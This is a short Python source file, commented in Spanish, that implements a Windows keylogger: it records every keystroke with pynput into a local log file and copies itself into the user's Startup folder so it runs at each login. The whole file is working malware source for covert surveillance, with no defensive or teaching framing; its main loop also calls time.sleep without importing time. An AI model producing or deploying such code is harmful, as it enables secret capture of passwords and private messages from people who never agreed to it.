import os
import shutil
import sys
import threading
import pynput.keyboard

# Configuración
LOG_FILE = "keylog.txt"  # Archivo para guardar las pulsaciones de teclas
STARTUP_FOLDER = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

# Función para capturar las pulsaciones de teclas
def keylogger():
    def on_press(key):
        try:
            with open(LOG_FILE, "a") as f:
                f.write(f"{key}\n")
        except Exception as e:
            print(f"Error al escribir en el archivo: {e}")

    keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
    with keyboard_listener:
        keyboard_listener.join()

# Función para copiar el script a la carpeta de inicio
def ensure_persistence():
    try:
        # Obtener la ruta del script actual
        script_path = os.path.abspath(sys.argv[0])
        script_name = os.path.basename(script_path)

        # Ruta de destino en la carpeta de inicio
        destination_path = os.path.join(STARTUP_FOLDER, script_name)

        # Copiar el script a la carpeta de inicio si no está ya allí
        if not os.path.exists(destination_path):
            shutil.copy(script_path, destination_path)
            print(f"Script copiado a: {destination_path}")
    except Exception as e:
        print(f"Error al copiar el script: {e}")

# Función principal
def main():
    # Asegurar la persistencia
    ensure_persistence()

    # Ejecutar el keylogger en un hilo separado
    keylogger_thread = threading.Thread(target=keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    # Mantener el script en ejecución
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()